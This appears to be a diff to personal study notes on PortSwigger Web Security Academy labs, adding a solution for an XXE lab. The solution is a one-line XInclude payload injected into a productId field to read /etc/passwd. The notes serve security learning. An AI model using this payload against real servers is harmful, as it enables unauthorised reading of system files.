@@ -91,6 +91,23 @@ In the browser DevTools panel, go to the Elements tab and study the HTML content
  Scan for gadgets
  Exploit
 
+## Exploiting XInclude to retrieve files 
+
+**Chapter:**
+  https://portswigger.net/web-security/xxe
+  
+**Lab:**
+  https://portswigger.net/web-security/xxe/lab-xinclude-attack
+  
+
+
+**Solution:** 
+  Xinclude in productId
+  <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+  
+  
+
 
 
 # Template:
@@ -105,5 +122,3 @@ In the browser DevTools panel, go to the Elements tab and study the HTML content
 
 **Solution:** 
 
-
-  **solution:** 
